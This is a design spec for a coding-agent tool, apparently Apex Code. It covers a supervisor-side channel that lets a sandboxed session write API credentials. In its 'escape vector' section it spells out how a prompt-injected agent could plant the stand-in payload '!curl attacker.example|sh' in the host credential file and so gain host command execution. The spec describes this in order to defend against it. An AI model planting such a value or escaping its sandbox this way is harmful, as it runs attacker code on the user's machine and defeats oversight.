# Spec: Supervisor-mediated credential writes

## Metadata

| Field | Value |
| --- | --- |
| Author | `fchery87` |
| Status | `Implemented` |
| Created | `2026-08-22` |
| Last updated | `2026-08-22` |
| Roadmap phase | `none — follow-up to Phase 2b (OS sandbox)` |
| Tracking issue/PR | `https://github.com/Fchery87/apex-code/pull/33` |
| Compatibility posture | Preserves compatibility. No credential written today stops working, no settings key changes, and every existing read path is untouched. The change is purely additive: a write that fails today begins to succeed. The one deliberate incompatibility is that a credential written *through the new channel* may not contain a config-value reference (see "The escape vector"), which no existing caller does, because no existing caller can write at all from a session. |

## Executive summary

No credential can be written from a running Apex Code session. Every interactive session
runs inside the OS sandbox, which bind-mounts `auth.json` read-only, so `/login` and the
`/settings` web-search key row both fail with a raw `EACCES` naming a path the user can
see is writable from their own shell. This spec proposes a supervisor-mediated write
channel modelled on the existing sandbox network proxy, and settles the security question
that channel raises: the `bash` tool runs inside the child, so anything the child can
reach, a model-driven command can also reach.

## Context and motivation

Phase 2b made the sandbox fail-closed and mounted the host credential file read-only. That
was correct: the agent should not be able to exfiltrate or tamper with credentials, and
`test/sandbox/credential-handoff.test.ts` pins the read-only behaviour deliberately.

What was never built is the other half. Credentials still need to be *written* sometimes,
and the only surfaces that write them live inside the child:

- `/login`, documented in `docs/providers.md` as the way to store a provider API key.
- `/settings` → Web search API key, added in PR #33.

Both call `AuthStorage.modify`, which opens the host file for writing and is refused.

The gap is not theoretical. It was found by a user typing a key into the settings row and
getting `EACCES: permission denied, open '/home/<user>/.apex-code/agent/auth.json'`, then
verifying from their own shell that the file is `0600`, owned by them, and writable.

## Current state

- `requiresSandboxedChild` (`core/sandbox/cli-launch.ts:17`) exempts only `auth`, `config`,
  `install`, `remove`, `uninstall`, `update`, `list`, the metadata flags, and `--help`.
  Every session that can construct an agent is sandboxed. There is no opt-out flag.
- The supervisor passes the host credential path as `readOnlyFiles` and advertises it to
  the child as `APEX_CODE_AUTH_PATH` (`cli-launch.ts:295`, `:309`).
- `linux-backend.ts:178` opens each read-only file with `openSync(path, "r")` and binds it
  into the child through `bwrap`. The child holds a read-only descriptor by construction.
- `getAuthPath()` (`config.ts:539`) returns `APEX_CODE_AUTH_PATH` when set, so every
  `AuthStorage` inside the child resolves to the read-only host file.
- `apex-code auth` cannot write either. It supports `check`, `print-api-key`, and
  `print-bearer-token` only (`cli/auth-command.ts`).
- `ReadOnlyAuthStorage` exists (`core/auth-storage.ts:204`) and throws a clear message, but
  is wired only to the `--no-refresh` CLI path (`main.ts:190`), not to the sandbox.
- A precedent for supervisor-mediated services already exists. The network proxy runs in
  the supervisor, listens on a unix socket, is bind-mounted into the child, is advertised
  as `APEX_UDS_PATH`, and enforces the host allowlist per request while recording refusals
  into `SandboxViolationStore`.

## The problem

Two problems, and the second is the one that makes this a spec rather than a patch.

**1. There is no write path.** A user cannot save a credential from the product's own UI.
The failure is reported as a filesystem permission error, which sends them to inspect a
file that is not the obstacle.

**2. The child cannot be trusted to ask.** The child process hosts both the TUI, which is
user-driven, and the agent loop, whose `bash` tool executes model-chosen commands *inside
that same process's sandbox*. Any socket the child can reach, a model-driven `bash`
command can also reach. The supervisor owns no terminal — the child does — so the
supervisor cannot prompt the user to confirm, and it cannot distinguish "the human typed
a key into `/settings`" from "the model wrote to the socket."

This is not a reason to abandon the channel. It is a constraint on what the channel may
be allowed to do.

### The escape vector

The severe risk is not a stolen or forged key. It is arbitrary host code execution.

`resolveConfigValue` (`core/resolve-config-value.ts`) treats a stored value beginning with
`!` as a shell command and executes it. Credentials are resolved on both sides of the
boundary: `AuthStorage.read` resolves them inside the child, and the supervisor resolves
config-value references on the host during launch — `resolveSupervisorAllowedHosts` reads
settings before the child exists.

So a child that can write `{"type":"api_key","key":"!curl attacker.example|sh"}` into the
host credential file has arranged for the host to execute an attacker-chosen command the
next time anything resolves that credential. That is a sandbox escape, reachable from a
prompt injection, and it is introduced entirely by adding the write channel.

Note what is *not* newly at risk. The credential file is already readable inside the
child, so confidentiality is conceded today and this change does not worsen it. What the
channel adds is integrity, and with it the reference-execution vector above.

## Goals

- `/login` and the `/settings` credential row succeed inside a normal sandboxed session.
- A credential written through the channel cannot cause host command execution.
- Every write is auditable, and refusals are visible in the same place sandbox violations
  already surface.
- No change to how credentials are read, on either side of the boundary.
- The channel is one mechanism serving every credential surface, not one per caller.

## Non-goals

- **Not a general filesystem write channel.** This is credentials only. A generic
  "supervisor writes for the child" primitive is a much larger security surface and no
  caller needs it.
- **Not confirmation-in-the-supervisor.** The supervisor has no terminal. Any design that
  requires it to prompt is out of scope until the terminal ownership question is solved
  separately.
- **Not credential *deletion* policy changes.** Delete goes through the same channel and
  the same constraints; nothing about which credentials may exist changes.
- **Not removing the read-only mount.** The mount stays. The channel is the exception, and
  it is narrow.

## Proposed solution

A supervisor-side credential writer, reached over the existing unix socket pattern.

**Transport.** Reuse the network proxy's shape rather than inventing one: a unix socket
created by the supervisor, bind-mounted into the child, advertised through an environment
variable. A distinct socket from the network proxy, because the two carry unrelated
protocols and merging them would put credential writes behind a CONNECT parser.

**Protocol.** One request type: write or delete one credential, addressed by id. A literal
key string, or a delete. The response is success or a named refusal.

**The content constraint that makes this safe.** The supervisor rejects any value that
`isCommandConfigValue` recognises, and any value containing a `$` reference. Only a
literal secret may be written through the channel. This is what removes the escape vector:
the child can write a key, but not a program.

A user who genuinely wants `!op read op://...` in their credential file still has the path
they have today — edit the file, or set the environment variable — and that path runs
outside the sandbox where the user, not the agent, is the author.

**Audit.** Every accepted write and every refusal is recorded through the existing
`SandboxViolationStore` path, so a credential written by a prompt-injected agent is at
least visible after the fact rather than silent.

**What this deliberately does not solve.** The supervisor still cannot tell the human from
the model. The mitigation is that the *worst case has been reduced to something survivable*
— an agent can overwrite a provider key, which breaks that provider or bills someone
else's account, and can be seen in the audit tail. It cannot execute code on the host.
Whether that residual risk is acceptable is the decision this spec asks for, and it should
be made explicitly rather than inherited from an implementation.

**Rejected alternative: a writable copy in the child.** Mount a writable credential file
inside the child and reconcile it to the host on exit. Rejected because reconciliation is
a second trust boundary with the same problem and worse failure modes, and because a
crashed session silently loses the credential the user just typed.

**Rejected alternative: keep failing, improve the message.** This is what PR #33 currently
does, and it is the right interim state. It is rejected as the end state because the
product documents `/login` as the way to store a key and that instruction is false in
every normal session.

## Deletion inventory

- Nothing. This change is purely additive: it makes a write that fails today begin to
  succeed, and removes no existing path. `ReadOnlyAuthStorage` stays, since
  `--no-refresh` still needs it, and every credential read path is untouched.
- One thing this change *enables* a later removal of, without doing it here: once writes
  succeed, any caller that reports a sandbox-refused write can drop its explanatory
  message. No such caller exists at the time of writing -- the `/settings` credential row
  that had one was removed rather than shipped against a write path that does not exist.

## Risks

- **The residual integrity risk is real and unmitigated by design.** A prompt-injected
  agent can overwrite a provider credential. Accepted only because the alternative is a
  product whose documented credential flow does not work, and because the audit tail makes
  it detectable.
- **A second socket into the child is a second attack surface.** Mitigated by a
  single-purpose protocol with no parser complexity, and by the content constraint.
- **Reference rejection will surprise someone.** A user who expects to type
  `!op read ...` into `/settings` will be refused. The refusal must say why and name the
  path that still works.
- **macOS backend parity.** `macos-backend.ts` must implement the same socket projection or
  the feature silently exists on one platform only. Verification must cover both.

## Verification

- A real sandboxed CLI turn that writes a credential and observes it on the host,
  extending `test/sandbox/credential-handoff.test.ts` rather than duplicating its setup.
- A negative test per rejected content class: `!command`, `$VAR`, `${VAR}`.
- A test that the read-only mount is still in force, so the channel is proven to be the
  only write path rather than an accidental loosening of the mount.
- A test that a refusal is recorded in the violation tail.
- Both platform backends, because a socket that exists only on Linux is a silent gap.

## Rollout

Single change, no flag. The channel is either present and constrained or absent; a
half-enabled credential writer is worse than either. `/login` and the `/settings` row both
switch to it in the same change, because leaving one on the failing path would preserve
exactly the inconsistency this spec exists to remove.
